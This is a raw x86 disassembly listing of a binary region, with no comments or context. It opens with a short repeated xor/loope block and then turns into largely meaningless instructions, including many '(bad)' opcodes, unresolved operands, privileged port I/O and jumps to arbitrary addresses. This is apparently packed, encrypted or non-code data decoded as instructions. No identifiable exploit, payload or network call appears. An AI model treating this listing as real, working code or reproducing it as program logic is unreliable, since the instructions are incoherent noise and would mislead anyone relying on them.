  423382:	jl     0x42331d
  423384:	xchg   ebp,eax
  423385:	pusha  
  423386:	xor    eax,0x4a3e704a
  42338b:	loope  0x42336c
  42338d:	cli    
  42338e:	push   edx
  42338f:	jl     0x42332a
  423391:	xchg   ebp,eax
  423392:	pusha  
  423393:	xor    eax,0x4a3e704a
  423398:	loope  0x423379
  42339a:	cli    
  42339b:	push   edx
  42339c:	jl     0x423337
  42339e:	xchg   ebp,eax
  42339f:	pusha  
  4233a0:	xor    eax,0x4a3e704a
  4233a5:	loope  0x423386
  4233a7:	cli    
  4233a8:	push   edx
  4233a9:	jl     0x423344
  4233ab:	xchg   ebp,eax
  4233ac:	pusha  
  4233ad:	xor    eax,0x4a3e704a
  4233b2:	loope  0x423393
  4233b4:	cli    
  4233b5:	push   edx
  4233b6:	jl     0x423351
  4233b8:	xchg   ebp,eax
  4233b9:	pusha  
  4233ba:	xor    eax,0x4a3e704a
  4233bf:	loope  0x4233a0
  4233c1:	cli    
  4233c2:	push   edx
  4233c3:	cmp    esi,DWORD PTR [edi-0x61]
  4233c6:	pusha  
  4233c7:	sbb    cl,BYTE PTR [edx+0x70]
  4233ca:	cs dec edx
  4233cc:	loope  0x4233c3
  4233ce:	pop    eax
  4233cf:	mov    BYTE PTR ds:0xab4d6aff,cl
  4233d5:	int    0x20
  4233d7:	sar    DWORD PTR [ecx+ecx*1-0x34],cl
  4233db:	dec    esi
  4233dc:	(bad)  
  4233dd:	sbb    ch,al
  4233df:	adc    DWORD PTR [edx],edi
  4233e1:	es sti 
  4233e3:	(bad)  
  4233e4:	sub    BYTE PTR [edi],ah
  4233e6:	add    eax,0x52947b55
  4233eb:	sti    
  4233ec:	add    eax,0x3f790c5f
  4233f1:	(bad)  
  4233f2:	pop    ebp
  4233f3:	ret    
  4233f4:	(bad)  
  4233f6:	cmc    
  4233f7:	hlt    
  4233f8:	int3   
  4233f9:	les    ecx,FWORD PTR ds:0xe34d789c
  4233ff:	pop    esi
  423400:	push   eax
  423401:	mov    edi,0x885a09ea
  423406:	jp     0x423411
  423408:	xchg   esp,eax
  423409:	es xchg edi,eax
  42340b:	test   BYTE PTR [esi+0x26],ah
  42340e:	push   edx
  42340f:	scas   al,BYTE PTR es:[edi]
  423410:	lods   al,BYTE PTR ds:[esi]
  423411:	dec    edx
  423412:	jmp    0xea7a2d6f
  423417:	mov    ecx,0xe098dd3a
  42341c:	out    0x27,al
  42341e:	popa   
  42341f:	sub    BYTE PTR [ebx],bh
  423421:	mov    bh,0xae
  423423:	xchg   edx,eax
  423424:	aaa    
  423425:	je     0x42346d
  423427:	test   al,0xd2
  423429:	xchg   esi,eax
  42342a:	call   0x9f1fc925
  42342f:	sar    DWORD PTR [ebp-0x48d0cbb3],cl
  423435:	imul   edi,DWORD PTR [ecx],0x43f9bccc
  42343b:	sub    esi,DWORD PTR [esi-0x52]
  42343e:	xchg   edx,eax
  42343f:	xlat   BYTE PTR ds:[ebx]
  423440:	call   0x9ddc:0x79225caa
  423447:	jle    0x423434
  423449:	stos   DWORD PTR es:[edi],eax
  42344a:	push   cs
  42344b:	xchg   edx,eax
  42344c:	jmp    0xd81af689
  423451:	sub    DWORD PTR [eax+edi*4+0x747d3af0],0xa286bd21
  42345c:	or     edx,DWORD PTR [ecx]
  42345e:	push   eax
  42345f:	xchg   esp,eax
  423460:	inc    ebx
  423461:	pop    edi
  423462:	mov    ds:0x70566765,al
  423467:	cld    
  423468:	fisub  DWORD PTR [edx+0x1cc3911e]
  42346e:	vorps  ymm7,ymm0,YMMWORD PTR [eax+0x5b]
  423473:	(bad)  
  423474:	mov    ebp,0xb503220e
  423479:	(bad)  
  42347a:	pop    ss
  42347b:	pop    esi
  42347c:	cmp    bl,BYTE PTR [ebp+0x67]
  42347f:	sbb    bh,BYTE PTR [edx]
  423481:	mov    al,0x6f
  423483:	cwde   
  423484:	jl     0x423450
  423486:	inc    esi
  423487:	pop    es
  423488:	arpl   WORD PTR [ecx-0x4d],bp
  42348b:	jecxz  0x423506
  42348d:	jmp    0x423413
  42348f:	inc    edx
  423490:	js     0x4234bc
  423492:	xchg   BYTE PTR [edx+0x3c],ah
  423495:	mov    bh,0xba
  423497:	in     eax,dx
  423498:	xchg   ecx,eax
  423499:	dec    esp
  42349a:	or     bh,BYTE PTR [eax+0xd]
  42349d:	mov    esp,0x7b6d3d4a
  4234a2:	mov    BYTE PTR [ebx],bl
  4234a4:	popa   
  4234a5:	sahf   
  4234a6:	and    ch,BYTE PTR [edi-0x57198e99]
  4234ac:	vrsqrtps xmm0,XMMWORD PTR [esi-0x3a]
  4234b1:	out    dx,al
  4234b2:	or     eax,0x25d9655b
  4234b7:	ins    DWORD PTR es:[edi],dx
  4234b8:	or     dl,bh
  4234ba:	into   
  4234bb:	inc    edx
  4234bc:	sub    DWORD PTR [ebx+0x6e],esp
  4234bf:	sub    DWORD PTR [ebx],esp
  4234c1:	test   DWORD PTR [eax+eiz*2-0x6f],ecx
  4234c5:	gs retf 
  4234c7:	pop    ds
  4234c8:	xchg   eax,ebp
  4234ca:	arpl   WORD PTR [edx+0xff1db61],di
  4234d0:	cmp    ebp,ebp
  4234d2:	pushf  
  4234d3:	adc    al,0x33
  4234d5:	ds mov esi,0xf1bc33f7
  4234db:	jmp    0x6b9100b4
  4234e0:	jle    0x423538
  4234e2:	leave  
  4234e3:	rcr    BYTE PTR [ebx-0x55],1
  4234e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234e7:	lods   eax,DWORD PTR ds:[si]
  4234e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234ea:	repnz bound edi,QWORD PTR [edx]
  4234ed:	push   eax
  4234ee:	sub    BYTE PTR [edi+0x8],0x4
  4234f2:	out    0xa8,al
  4234f4:	sbb    DWORD PTR [edx+0x53],0x17033258
  4234fb:	cs popa 
  4234fd:	lods   al,BYTE PTR ds:[esi]
  4234fe:	test   DWORD PTR [edi],edi
  423500:	mov    ch,0x5c
  423502:	dec    eax
  423503:	jp     0x423499
  423505:	xor    eax,0x6f890b1b
  42350a:	push   esi
  42350b:	mov    dh,0x32
  42350d:	or     ah,BYTE PTR [edx]
  42350f:	xchg   edi,eax
  423510:	and    dl,BYTE PTR [ecx]
  423512:	shl    esi,1
  423514:	outs   dx,BYTE PTR ds:[esi]
  423515:	imul   ebx,esp,0xdff18f38
  42351b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42351c:	jne    0x4234d7
  42351e:	sbb    al,0xa1
  423520:	pop    esp
  423521:	mov    ds:0xd2bc6ec2,eax
  423526:	hlt    
  423527:	cs out 0xd3,al
  42352a:	jmp    0xb2621e3f
  42352f:	(bad)  
  423530:	retf   
  423531:	sbb    eax,0x9cd1860f
  423536:	xor    eax,0x66d2bef8
  42353b:	inc    ecx
  42353c:	lea    ecx,[edx+ecx*1]
  42353f:	fcmovnbe st,st(3)
  423541:	mov    ebx,0xd5341eb1
  423546:	shl    BYTE PTR [eax+ecx*8+0x4cf69340],0xd4
  42354e:	loopne 0x42358a
  423550:	pop    edx
  423551:	ja     0x4234e5
  423553:	rol    BYTE PTR [edi],0xc0
  423556:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423557:	aam    0x4f
  423559:	push   ds
  42355a:	sbb    al,0x8e
  42355c:	and    ch,BYTE PTR [edx+0x7db838f5]
  423562:	fwait
  423563:	mov    edi,?
  423565:	and    bl,BYTE PTR [ecx-0x7c4e56d8]
  42356b:	(bad)  [ecx-0x69bad5d]
  423571:	jle    0x4235a2
  423573:	jne    0x4234f7
  423575:	pop    ecx
  423576:	push   ds
  423577:	out    0x1d,eax
  423579:	fs ja  0x4235b1
  42357c:	sub    DWORD PTR [ebx],ebx
  42357e:	mov    ch,0x95
  423580:	xchg   ebp,eax
  423581:	jmp    0x3017:0xf8141ae4
  423588:	or     ecx,DWORD PTR [ebx-0x391ad8a2]
  42358e:	sar    ecx,0xd7
  423591:	lock in al,0xc5
  423594:	adc    edx,ecx
  423596:	fldenv [eax+0x7d]
  423599:	(bad)
  42359d:	dec    ebp
  42359e:	or     al,0xbd
  4235a0:	test   al,0x7a
  4235a2:	repz dec ebp
  4235a4:	les    edi,FWORD PTR [eax-0x75]
  4235a7:	push   ds
  4235a8:	rcl    BYTE PTR [esi],0xc2
  4235ab:	retf   0x48c2
  4235ae:	shr    esi,1
  4235b0:	xchg   ebp,eax
  4235b1:	pushf  
  4235b2:	int    0x6d
  4235b4:	arpl   WORD PTR [edi],cx
  4235b6:	push   edi
  4235b7:	jnp    0x4235ff
  4235b9:	fisttp QWORD PTR [esi+0x1a1cbed0]
  4235bf:	mov    ecx,?
  4235c1:	call   0xe2ba9e88
  4235c6:	pop    ss
  4235c7:	shl    BYTE PTR [esi],cl
  4235c9:	ins    BYTE PTR es:[edi],dx
  4235ca:	rol    BYTE PTR ds:[ebp+0x510e7755],0xa4
  4235d2:	xchg   esi,eax
  4235d3:	mov    eax,ds:0x27bc4a66
  4235d8:	adc    eax,0x2bfc563c
  4235dd:	addr16 (bad) 
  4235df:	icebp  
  4235e0:	test   eax,0xbd5b00c8
  4235e5:	push   ss
  4235e6:	and    al,BYTE PTR [eax+ebx*4-0x1c]
  4235ea:	pop    esp
  4235eb:	repz fiadd DWORD PTR [ecx+0x46e17f10]
  4235f2:	adc    ah,ah
  4235f4:	fdiv   QWORD PTR [esi]
  4235f6:	jg     0x423647
  4235f8:	mov    DWORD PTR [edi+eiz*1+0xdbc26a6],0x660f5073
  423603:	and    al,0x35
  423605:	sbb    al,0x9a
  423607:	sub    DWORD PTR es:[ebp-0x5a],ebx
  42360b:	clc    
  42360c:	mov    ch,0x82
  42360e:	and    DWORD PTR [esi+eiz*2],esp
  423611:	sti    
  423612:	ds aad 0x90
  423615:	xchg   BYTE PTR [edx],dl
  423617:	in     al,dx
  423618:	pop    edi
  423619:	mov    eax,ds:0xc8ec961f
  42361e:	and    al,0x22
  423620:	mul    DWORD PTR [ebp-0x40]
  423623:	mov    ds:0x7acd37c7,al
  423628:	loopne 0x4235c7
  42362a:	jmp    0x42361e
  42362c:	loopne 0x4235d0
  42362e:	fdivr  DWORD PTR [edx+eiz*2]
  423631:	rep outs dx,BYTE PTR ds:[esi]
  423633:	inc    ecx
  423634:	pop    ebx
  423635:	cmp    al,0x81
  423637:	call   0x203f51f0
  42363c:	adc    al,0xde
  42363e:	(bad)  
  42363f:	retf   
  423640:	push   esi
  423641:	mov    eax,ds:0xd94587fb
  423646:	fstp   QWORD PTR [edx-0x23]
  42364a:	sbb    dl,bh
  42364c:	mov    eax,0xf8987107
  423651:	inc    edx
  423652:	and    ch,cl
  423654:	push   0x46
  423656:	retf   0x6c9d
  423659:	outs   dx,DWORD PTR ds:[esi]
  42365a:	push   ebp
  42365b:	arpl   WORD PTR [esi-0xb],bp
  42365e:	add    al,0x1e
  423660:	lods   eax,DWORD PTR ds:[esi]
  423661:	sbb    edi,DWORD PTR [ebx]
  423663:	je     0x423633
  423665:	pop    edi
  423666:	imul   edi,DWORD PTR [edx-0xc307289],0xffffff96
  42366d:	jmp    0x5b5de522
  423672:	sub    eax,0xf68d4849
  423677:	(bad)  
  423678:	into   
  423679:	hlt    
  42367a:	fsubr  QWORD PTR [esi]
  42367c:	fistp  DWORD PTR [edx+0xc]
  42367f:	pop    ds
  423680:	and    al,0x65
  423682:	jp     0x423688
  423684:	lea    edi,[esi]
  423686:	popa   
  423687:	clc    
  423688:	mov    BYTE PTR [edi-0x476747ed],bh
  42368e:	sbb    al,0xab
  423690:	inc    edx
  423691:	sti    
  423692:	mov    DWORD PTR [esi+0x4a02f25a],ebp
  423698:	push   esp
  423699:	fst    QWORD PTR [eax-0x40]
  42369c:	fcomp  QWORD PTR [eax]
  42369e:	xor    esi,DWORD PTR [edx-0x17dacf1f]
  4236a4:	push   ss
  4236a5:	shl    BYTE PTR [ebp+0x3f],1
  4236a8:	pusha  
  4236a9:	pusha  
  4236aa:	ss cwde 
  4236ac:	pop    eax
  4236ad:	push   es
  4236ae:	test   esi,ecx
  4236b0:	push   ss
  4236b1:	adc    ebx,DWORD PTR ss:[ebp-0x26]
  4236b5:	xchg   edx,eax
  4236b6:	ficomp WORD PTR [ecx+0x5c]
  4236b9:	loopne 0x4236bc
  4236bb:	pop    esi
  4236bc:	scas   eax,DWORD PTR es:[edi]
  4236bd:	sbb    DWORD PTR [ebx-0x70875c36],edi
  4236c3:	cmp    DWORD PTR [esi],ebx
  4236c5:	sbb    eax,DWORD PTR [edi-0x1c6ff5b3]
  4236cb:	xchg   edi,eax
  4236cc:	pop    ecx
  4236cd:	jne    0x4236da
  4236cf:	repz rep lods al,BYTE PTR ds:[esi]
  4236d2:	ins    DWORD PTR es:[edi],dx
  4236d3:	mov    ah,0x97
  4236d5:	jb     0x423705
  4236d7:	pop    esp
  4236d8:	sub    eax,0x253b1a5f
  4236dd:	cmp    cl,cl
  4236df:	loop   0x42372f
  4236e1:	fs daa 
  4236e3:	shl    DWORD PTR [ebx+0x56],1
  4236e6:	xchg   ecx,eax
  4236e7:	ins    DWORD PTR es:[edi],dx
  4236e8:	adc    al,BYTE PTR [eax+eiz*1]
  4236eb:	outs   dx,DWORD PTR ds:[esi]
  4236ec:	daa    
  4236ed:	and    DWORD PTR [edx+0x1c],ecx
  4236f0:	mov    ebp,0x44771246
  4236f5:	push   cs
  4236f6:	push   edx
  4236f7:	mov    edi,0xd27ef86f
  4236fc:	int3   
  4236fd:	daa    
  4236fe:	mov    esp,0xf7dad903
  423703:	in     al,0x69
  423705:	cs popfw 
  423708:	lds    eax,FWORD PTR [esi-0x33f9939a]
  42370e:	retf   
  42370f:	jl     0x4236c4
  423711:	jnp    0x4236f3
  423713:	inc    eax
  423714:	test   BYTE PTR [ebx-0x78260dd],0xc7
  42371b:	and    DWORD PTR [ecx-0x54fa757c],ebp
  423721:	pusha  
  423722:	pop    es
  423723:	outs   dx,BYTE PTR ds:[esi]
  423724:	test   eax,0xb5582e57
  423729:	ficom  WORD PTR [edx-0x2b0db14e]
  42372f:	pop    ebx
  423730:	mov    WORD PTR [edx-0xc],sp
  423734:	add    DWORD PTR [eax-0x14],eax
  423737:	imul   ecx
  423739:	xor    BYTE PTR [ebp+0x26460b7b],bh
  42373f:	enter  0x6c2a,0x86
  423743:	mov    bh,0xd8
  423745:	clc    
  423746:	ins    DWORD PTR es:[edi],dx
  423747:	add    DWORD PTR [ecx-0x731cc698],ebx
  42374d:	mov    esp,0x3c7723ec
  423752:	jb     0x42375b
  423754:	cmp    eax,0xd4aefcf5
  423759:	gs out 0x95,eax
  42375c:	div    BYTE PTR [eax]
  42375e:	xchg   ebx,eax
  42375f:	enter  0x7715,0x3b
  423763:	retf   0xc21e
  423766:	sbb    eax,0xb7fa37ea
  42376b:	(bad)  
  42376d:	outs   dx,DWORD PTR ds:[esi]
  42376e:	push   eax
  42376f:	xor    al,0x9c
  423771:	cmp    al,0xf8
  423773:	lods   eax,DWORD PTR ds:[esi]
  423774:	cmp    BYTE PTR [edx-0x64b852b3],ch
  42377a:	iret   
  42377b:	xor    bh,BYTE PTR [ebx+eiz*2+0x2f]
  42377f:	iret   
  423780:	inc    ecx
  423781:	mov    eax,0xe8717d7d
  423786:	mov    DWORD PTR [ebp+0x3d87cfad],esi
  42378c:	xor    DWORD PTR [edx],ebx
  42378e:	jns    0x4237de
  423790:	xor    edi,DWORD PTR [edi-0x6a389279]
  423796:	or     eax,0xb5f563d7
  42379b:	shr    DWORD PTR [ebx+0x33],0xf9
  42379f:	mov    ah,0xcf
  4237a1:	sub    DWORD PTR [eax],0x3d
  4237a4:	in     al,dx
  4237a5:	ds xchg edx,eax
  4237a7:	call   0xc000:0xafb69592
  4237ae:	dec    esi
  4237af:	xchg   ebp,eax
  4237b0:	pop    es
  4237b1:	xor    BYTE PTR [esi-0x19],ch
  4237b4:	fs mov bh,0x33
  4237b7:	out    dx,al
  4237b8:	retf   0xe9b4
  4237bb:	mov    al,ds:0x8e31ca83
  4237c0:	jo     0x423835
  4237c2:	mov    BYTE PTR [edx+0x7d68e2b7],bl
  4237c8:	adc    BYTE PTR [esi-0x5e2b87d7],0xe9
  4237cf:	dec    esp
  4237d0:	call   0x964b:0x54495571
  4237d7:	sahf   
  4237d8:	inc    ebp
  4237d9:	inc    esi
  4237da:	(bad)  
  4237db:	frstor [ecx+edi*2+0x3d]
  4237df:	(bad)  [edi+0x8]
  4237e2:	test   BYTE PTR [eax],dh
  4237e4:	popa   
  4237e5:	jle    0x423805
  4237e7:	jp     0x4237a4
  4237e9:	xchg   edi,eax
  4237ea:	push   esp
  4237eb:	ins    BYTE PTR es:[edi],dx
  4237ec:	mov    ebx,0x5160a792
  4237f1:	cmp    esi,esi
  4237f3:	or     DWORD PTR [edx],eax
  4237f5:	aaa    
  4237f6:	cmp    BYTE PTR [ecx],0xf6
  4237f9:	sar    BYTE PTR [ebx-0x3c],1
  4237fc:	lods   eax,DWORD PTR ds:[esi]
  4237fd:	pushf  
  4237fe:	adc    DWORD PTR [ebx+esi*1-0x43863c9f],esi
  423805:	cwde   
  423806:	mov    al,ds:0x42008257
  42380b:	mul    DWORD PTR [ebp+0x37]
  42380e:	inc    ebx
  42380f:	les    eax,FWORD PTR cs:[eax+0x48]
  423813:	jmp    0x42379d
  423815:	ret    
  423816:	pop    ebx
  423817:	dec    ecx
  423818:	xor    al,dl
  42381a:	xor    eax,0x3b5dfa3d
  42381f:	xor    DWORD PTR [ebx-0x4f9d9d77],esi
  423825:	ds int 0xd7
  423828:	mov    esp,?
  42382a:	xor    BYTE PTR [ecx],cl
  42382c:	mov    eax,ds:0x8a6fc6f6
  423831:	loop   0x42383b
  423833:	add    BYTE PTR [esi],0xe6
  423836:	icebp  
  423837:	repz sbb eax,0x192452f8
  42383d:	adc    esi,DWORD PTR [edi-0x6c]
  423840:	jecxz  0x42386d
  423842:	adc    DWORD PTR [ebx],esi
  423844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423845:	loopne 0x423897
  423847:	dec    ecx
  423848:	mov    ds:0xfe5748f4,al
  42384d:	(bad)  
  42384e:	int    0x45
  423850:	dec    esi
  423851:	dec    ebx
  423852:	in     eax,dx
  423853:	xchg   esi,eax
  423854:	int    0x68
  423856:	mov    DWORD PTR [eax],ebx
  423858:	call   0x81afb880
  42385d:	sbb    eax,0x7244fee0
  423862:	loop   0x42389e
  423864:	shl    BYTE PTR [ecx+0x4afc7182],1
  42386a:	aad    0xed
  42386c:	test   ah,al
  42386e:	and    BYTE PTR cs:[ecx+0x23],bl
  423872:	out    0xe6,eax
  423874:	add    eax,0x5e0002f5
  423879:	adc    edi,DWORD PTR [ebx]
  42387b:	out    0xbf,al
  42387d:	sbb    edx,DWORD PTR [ecx]
  42387f:	adc    bh,BYTE PTR [edx-0x51]
  423882:	inc    eax
  423883:	cmp    eax,0x66abadfc
  423888:	sub    BYTE PTR [edx-0x14],dl
  42388b:	cmp    edx,DWORD PTR [ebp+0x75]
  42388e:	add    ch,BYTE PTR [esi+0x72]
  423891:	pop    esp
  423892:	int    0x86
  423894:	jne    0x423837
  423896:	ins    BYTE PTR es:[edi],dx
  423897:	sub    BYTE PTR [edx-0x3436bd30],dh
  42389d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42389e:	xor    dh,dh
  4238a0:	xor    eax,0x41b6c621
  4238a5:	ud2    
  4238a7:	mov    al,0x5f
  4238a9:	xchg   edx,eax
  4238aa:	pop    es
  4238ab:	ds fwait
  4238ad:	mov    ebp,0xf6dfe70
  4238b2:	imul   edx,DWORD PTR [ecx+0x6b1c01f9],0xffffffa9
  4238b9:	xor    dl,BYTE PTR [esi+0x30b10778]
  4238bf:	pop    eax
  4238c0:	out    dx,al
  4238c1:	mov    dl,0xcf
  4238c3:	push   cs
  4238c4:	sub    BYTE PTR [edx+0x23f1a75a],ch
  4238ca:	ss cs ss push ebp
  4238ce:	scas   eax,DWORD PTR es:[edi]
  4238cf:	dec    edi
  4238d0:	inc    edx
  4238d1:	rol    eax,0xb9
  4238d4:	mov    edx,DWORD PTR [ecx-0x516f60d8]
  4238da:	mov    ah,BYTE PTR [ebp-0x14e18c11]
  4238e0:	scas   eax,DWORD PTR es:[edi]
  4238e1:	pop    esi
  4238e2:	push   edx
  4238e3:	pop    ds
  4238e4:	shl    bl,cl
  4238e6:	fcmovnu st,st(5)
  4238e8:	aad    0x4a
  4238ea:	pop    edi
  4238eb:	push   esi
  4238ec:	inc    eax
  4238ed:	pop    ecx
  4238ee:	idiv   BYTE PTR [ebp+0x10]
  4238f1:	mov    ah,0xdf
  4238f3:	popa   
  4238f4:	mov    al,ds:0x5cba96ab
  4238f9:	shr    DWORD PTR [eax],1
  4238fb:	in     eax,0x5e
  4238fd:	mov    ebx,esp
  4238ff:	jecxz  0x4238ef
  423901:	mov    dh,0xd7
  423903:	in     eax,0x3
  423905:	in     eax,dx
  423906:	and    ch,BYTE PTR [esi-0x153d97c1]
  42390c:	mov    edi,0xfaa52fda
  423911:	aad    0x91
  423913:	repnz push eax
  423915:	in     eax,dx
  423916:	and    ah,BYTE PTR [edx+0x6a]
  423919:	push   ecx
  42391a:	fld    DWORD PTR [edi+edx*1+0x4]
  42391e:	pop    edx
  42391f:	mov    ebx,0xefc966f1
  423924:	xchg   ecx,eax
  423925:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423926:	data16 and bh,ch
  423929:	mov    ecx,edi
  42392b:	es push ds
  42392d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42392e:	jns    0x42392f
  423930:	push   edi
  423931:	push   eax
  423932:	xlat   BYTE PTR ds:[ebx]
  423933:	popf   
  423934:	ja     0x4238ee
  423936:	dec    ecx
  423937:	scas   eax,DWORD PTR es:[edi]
  423938:	imul   esi,DWORD PTR [ebp-0x6802ae71],0xffffffaf
  42393f:	mov    bh,0x14
  423941:	cmp    ebp,DWORD PTR [eax]
  423943:	(bad)  
  423944:	dec    ebp
  423945:	repz mov esi,0x76156ee1
  42394b:	retf   
  42394c:	lods   eax,DWORD PTR ds:[esi]
  42394d:	push   0xe8f657a1
  423952:	adc    BYTE PTR [ebp+ecx*4+0x437e159d],al
  423959:	push   eax
  42395a:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  42395c:	cli    
  42395d:	fistp  QWORD PTR [eax+0x2e]
  423960:	(bad)  
  423961:	push   edx
  423962:	imul   ecx,ebp,0xd548ee01
  423968:	out    dx,al
  423969:	iret   
  42396a:	shl    DWORD PTR [eax+0x73],cl
  42396d:	pop    eax
  42396e:	and    al,0xc4
  423970:	fdivrp st(5),st
  423972:	gs test al,0x98
  423975:	mov    edx,0x19a4dee6
  42397a:	rol    DWORD PTR es:[ecx],0xd9
  42397e:	push   ds
  42397f:	cmp    eax,0x7c835b5e
  423984:	mov    esi,0xe8da6825
  423989:	add    ah,BYTE PTR [ebp-0x24]
  42398c:	popf   
  42398d:	inc    edi
  42398f:	xlat   BYTE PTR ds:[ebx]
  423990:	bound  esi,QWORD PTR [edx+0x3f22e468]
  423996:	dec    ebx
  423997:	std    
  423998:	push   0xa09a1b8e
  42399d:	in     al,dx
  42399e:	(bad)  
  42399f:	dec    DWORD PTR [edi-0x4e]
  4239a2:	push   ebx
  4239a3:	xchg   ecx,eax
  4239a4:	das    
  4239a5:	jmp    0x701b:0x56050ca2
  4239ac:	arpl   bx,si
  4239ae:	add    BYTE PTR [edx],dl
  4239b0:	push   eax
  4239b1:	paddq  mm1,QWORD PTR [ecx*1-0x649ea34d]
  4239b9:	out    dx,eax
  4239ba:	inc    ecx
  4239bb:	icebp  
  4239bc:	mov    ah,BYTE PTR [edx]
  4239be:	xchg   ecx,eax
  4239bf:	inc    edx
  4239c0:	and    al,0xa7
  4239c2:	in     eax,dx
  4239c3:	mov    ecx,0x93538c93
  4239c8:	pop    ds
  4239c9:	or     dl,BYTE PTR [edi-0x2987cba1]
  4239cf:	aaa    
  4239d0:	ds mov ebp,0x80efa8ef
  4239d6:	sbb    BYTE PTR [esi+0x5e],ah
  4239d9:	leave  
  4239da:	push   esp
  4239db:	dec    edi
  4239dc:	xchg   BYTE PTR [esi+0x7c],bl
  4239df:	pop    edx
  4239e0:	adc    BYTE PTR [esi],cl
  4239e2:	cmp    eax,0x962a16e8
  4239e7:	sub    eax,0x562163ba
  4239ec:	jg     0x4239ea
  4239ee:	arpl   WORD PTR [edx-0x602458d2],dx
  4239f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239f5:	mov    ebp,DWORD PTR [esi+0x58]
  4239f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239f9:	xor    eax,0x1f3ab90
  4239fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239ff:	sub    ah,al
  423a01:	int3   
  423a02:	fcom   QWORD PTR [ebp+esi*4-0x5adbd4f8]
  423a09:	dec    ebp
  423a0a:	rcl    BYTE PTR ss:[edx],cl
  423a0d:	sbb    edx,ebp
  423a0f:	rcr    DWORD PTR [eax-0x18],1
  423a12:	inc    edi
  423a13:	inc    esp
  423a14:	mov    edi,DWORD PTR [edi-0x73e97e79]
  423a1a:	in     eax,0xb4
  423a1c:	in     al,dx
  423a1d:	and    eax,0x3892ea52
  423a22:	test   DWORD PTR [ecx-0xf00caaa],eax
  423a28:	sbb    eax,0x41f423e2
  423a2d:	push   ebx
  423a2e:	fist   DWORD PTR [edx+0x10]
  423a31:	icebp  
  423a32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a33:	loope  0x4239de
  423a35:	push   es
  423a36:	leave  
  423a37:	shl    esp,cl
  423a39:	data16 arpl WORD PTR [edi-0x45],sp
  423a3d:	aas    
  423a3e:	std    
  423a3f:	cmp    DWORD PTR [eax+0x4d],0xffffffb9
  423a43:	aas    
  423a44:	(bad)  
  423a46:	push   ss
  423a47:	pusha  
  423a48:	and    ch,BYTE PTR [esi+eiz*1]
  423a4b:	outs   dx,BYTE PTR ds:[esi]
  423a4c:	and    BYTE PTR [ebx-0x24dd8acd],cl
  423a52:	aaa    
  423a53:	enter  0xa2d1,0x11
  423a57:	(bad)  
  423a58:	mul    BYTE PTR [ebx-0x4d347c41]
  423a5e:	jg     0x423a22
  423a60:	arpl   WORD PTR [ebp-0x2c],di
  423a63:	push   es
  423a64:	lods   al,BYTE PTR ds:[esi]
  423a65:	sbb    al,0xfd
  423a67:	ds mov ah,0xa8
  423a6a:	xor    eax,ebp
  423a6c:	mov    ebx,0x6f1db9d7
  423a71:	fcom   st(0)
  423a73:	pop    ebx
  423a74:	icebp  
  423a75:	sub    eax,DWORD PTR [esp+esi*1-0x78ad4ae7]
  423a7c:	pushf  
  423a7d:	lods   eax,DWORD PTR ds:[esi]
  423a7e:	push   0xe873e664
  423a83:	loope  0x423a3a
  423a85:	add    eax,DWORD PTR [ebp-0x6846153d]
  423a8b:	push   esp
  423a8c:	gs xor cl,bl
  423a8f:	mov    DWORD PTR [edx+eax*1],eax
  423a92:	(bad)  
  423a93:	push   ebp
  423a94:	jbe    0x423af3
  423a96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a97:	sub    DWORD PTR [edi-0x29],0xdbd54d16
  423a9e:	fdiv   DWORD PTR [eax]
  423aa0:	add    BYTE PTR [eax+0x2b7180a2],al
  423aa6:	das    
  423aa7:	add    ebx,DWORD PTR [esi-0x72aa796b]
  423aad:	mov    eax,0xcf888bc0
  423ab2:	cli    
  423ab3:	test   al,0x6e
  423ab5:	jbe    0x423b18
  423ab7:	inc    BYTE PTR [ecx]
  423ab9:	xchg   DWORD PTR [ecx],ebx
  423abb:	aaa    
  423abc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423abd:	fimul  WORD PTR [edi]
  423abf:	call   0xbbeb:0x70551c3e
  423ac6:	outs   dx,BYTE PTR ds:[esi]
  423ac7:	sbb    edi,DWORD PTR [esi+0x7a]
  423aca:	add    DWORD PTR [edx+0x561a920d],ecx
  423ad0:	mov    ch,0xf4
  423ad2:	or     al,0xce
  423ad4:	add    BYTE PTR [ebp-0x3d],bl
  423ad7:	mov    ch,0x2d
  423ad9:	ret    0x81ec
  423adc:	push   ds
  423add:	dec    ebx
  423ade:	mov    ebx,0xf6209045
  423ae3:	fucomip st,st(6)
  423ae5:	or     eax,0xc6cdec9c
  423aea:	sti    
  423aeb:	loope  0x423a7f
  423aed:	into   
  423aee:	mov    dh,BYTE PTR [eax-0x1d]
  423af1:	test   dl,al
  423af3:	push   esp
  423af4:	(bad)  
  423af5:	mov    edi,0xc0d380ab
  423afa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423afb:	xchg   BYTE PTR [ebp-0x7c046aa8],bh
  423b01:	dec    esi
  423b02:	mov    esi,0xbe46e53
  423b07:	in     al,dx
  423b08:	or     bh,BYTE PTR ds:0xd55efb5
  423b0e:	das    
  423b0f:	hlt    
  423b10:	adc    eax,0x6b403284
  423b15:	fdivr  QWORD PTR ds:0x34d7515f
  423b1b:	jge    0x423b88
  423b1d:	inc    edx
  423b1e:	inc    edx
  423b1f:	inc    ecx
  423b20:	mov    eax,0x65bb289d
  423b25:	or     eax,0xe657fd16
  423b2a:	(bad)  
  423b2b:	xor    BYTE PTR [eax+0x4d],ch
  423b2e:	sti    
  423b2f:	or     eax,0xa70ad01b
  423b34:	or     esp,0x1d3479b2
  423b3a:	hlt    
  423b3b:	push   esp
  423b3c:	adc    eax,0xebdf228a
  423b41:	arpl   WORD PTR [eax+0x79],bx
  423b44:	int3   
  423b45:	xor    eax,0xf892af85
  423b4a:	push   edx
  423b4b:	in     al,0xdf
